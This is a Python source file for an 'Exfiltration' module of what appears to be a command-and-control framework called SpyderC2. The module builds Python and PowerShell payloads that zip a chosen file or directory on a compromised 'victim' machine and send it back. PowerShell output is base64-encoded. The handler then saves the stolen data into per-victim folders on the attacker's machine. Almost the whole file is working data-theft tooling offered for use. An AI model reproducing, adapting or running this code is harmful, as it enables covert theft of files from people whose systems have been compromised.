import sys
import os
import pdb
import pathlib
import time
import base64
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module

class Exfiltration(Module):
	description = 'This module downloads the specified files on victim to the attacker'

	@classmethod
	def module_options(cls):
		h = {
			'path' : {'desc' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>. NOTE : The default path can be accessed in both docker and host, accessibility of custom path will depend on where you run the program.', 'required' : False},
			'location' : {'desc': 'Path of directory or file on victim to exfiltrate.','required': True}
		}
		return h

	def __init__(self,name,utility,language,options):

		## We are loading the script in the script variable here
		super(Exfiltration, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    

	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
	def handle_task_output(self,data,options,victim_id, task_id):

		## Default Dumping path
		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../shared/victim_data',victim_id)

		if not os.path.exists(dump_path):
			os.makedirs(dump_path)

		filename = f"exfiltration_file_{task_id}.zip"
		filepath = os.path.join(dump_path,filename)

		if 'path' in  options:
			if not os.path.exists(options['path']):
				print(f"Provided save path does not exists - {options['path']}. Saving to default directory {filepath}")
			else:
				filepath = os.path.join(options['path'],filename)


		## Check if we have write perms else save to /tmp/SpyderC2
		if not os.access(os.path.dirname(filepath), os.W_OK):
			dump_path = os.path.join('/tmp','SpyderC2',victim_id)
			print(f"No write access to {os.path.dirname(filepath)}. Saving to {dump_path}")
			if not os.path.exists(dump_path):
				os.makedirs(dump_path,exist_ok=True)
			filepath = os.path.join(dump_path,filename)

		## Dump the zip file
		with open(filepath, "wb") as f:
			if self.language == 'python':
				f.write(data)
			else:
				## Incase of powershell we send by base64 encoding
				decoded = base64.b64decode(data)
				f.write(decoded)
		f.close()

		output = filepath
		return output

	def script_python(self,options):
		script = """def execute_command():
		import os
		from os.path import isfile, join
		import shutil

		location = '##location##'
		
		if isfile(location):
			path = shutil.make_archive(location, 'zip',os.path.dirname(location), location)
		elif os.path.isdir(location):
			path = shutil.make_archive(location, 'zip',location, location)
		else:
			## Doesn't exist
			pass

		content = open(path,"rb").read()
		return content"""

		## TODO - make this through a loop for all params
		## TODO - this should be required parameter
		if 'location' in options:
			value = options['location']
		else:
			value = options['stager_location']

		script = script.replace('##location##',value.replace('\\','\\\\'))
		return script


	def script_powershell(self,options):
		script = """Compress-Archive -Path ##location## -DestinationPath ##location##.zip -Force
		$bytes = [System.IO.File]::ReadAllBytes('##location##.zip')
		$encoded = [System.Convert]::ToBase64String($bytes)
		return $encoded"""

		if 'location' in options:
			value = options['location']
		else:
			value = options['stager_location']

		script = script.replace('##location##',value)

		return script


					
				
